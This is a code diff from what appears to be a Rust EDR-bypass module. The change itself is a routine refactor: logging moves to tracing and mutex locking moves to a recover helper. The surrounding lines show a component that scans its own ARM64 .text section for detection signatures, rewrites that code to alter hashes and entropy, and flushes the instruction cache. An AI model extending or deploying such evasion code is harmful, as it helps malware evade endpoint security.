@@ -72,6 +72,7 @@ const _: () = assert!(
     "PAGE_READWRITE must differ from PAGE_EXECUTE_READWRITE"
 );
 
+use common::lock::MutexExt;
 use anyhow::{bail, Context, Result};
 use once_cell::sync::Lazy;
 use rand::Rng;
@@ -622,7 +623,7 @@ pub fn scan_for_signatures() -> Result<Vec<SignatureHit>> {
     hits.dedup_by(|a, b| a.offset == b.offset && a.name == b.name);
 
     LAST_SCAN_COUNT.store(hits.len() as u32, Ordering::Relaxed);
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: ARM64 scan found {} signature hits",
         hits.len()
     );
@@ -1410,7 +1411,7 @@ pub fn run_edr_bypass_transform(
     let text_before = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
     let hash_before = hash_text(text_before);
     let entropy_before = shannon_entropy(text_before);
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: ARM64 .text entropy before transforms: {:.3}",
         entropy_before,
     );
@@ -1441,7 +1442,7 @@ pub fn run_edr_bypass_transform(
         .map(|h| h.offset)
         .collect();
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: ARM64 {} actionable hits out of {} total (entropy threshold: {:.1})",
         actionable_offsets.len(),
         hits.len(),
@@ -1518,7 +1519,7 @@ pub fn run_edr_bypass_transform(
     let hash_after = hash_text(text_after);
     let entropy_after = shannon_entropy(text_after);
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: ARM64 .text entropy after transforms: {:.3} (delta: {:+.3})",
         entropy_after,
         entropy_after - entropy_before,
@@ -1540,12 +1541,12 @@ pub fn run_edr_bypass_transform(
         ) {
             Ok(status) => status,
             Err(e) => {
-                log::warn!("edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}");
+                tracing::warn!("edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}");
                 0
             }
         };
         if status != 0 {
-            log::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
+            tracing::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
         }
     }
 
@@ -1576,7 +1577,7 @@ pub fn run_edr_bypass_transform(
         entropy_after,
     };
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: ARM64 cycle complete — {} transforms applied, {} skipped, {} ms, entropy {:.3}→{:.3}",
         applied,
         skipped,
@@ -1586,7 +1587,7 @@ pub fn run_edr_bypass_transform(
     );
 
     {
-        let mut guard = LAST_RESULT.lock().unwrap();
+        let mut guard = LAST_RESULT.lock_recover();
         *guard = Some(result.clone());
     }
 
@@ -1601,7 +1602,7 @@ pub fn status() -> String {
     let last_timestamp = LAST_SCAN_TIMESTAMP.load(Ordering::Relaxed);
 
     let last_cycle_info = {
-        let guard = LAST_RESULT.lock().unwrap();
+        let guard = LAST_RESULT.lock_recover();
         guard.as_ref().map(|r| {
             serde_json::json!({
                 "hash_before": r.hash_before,
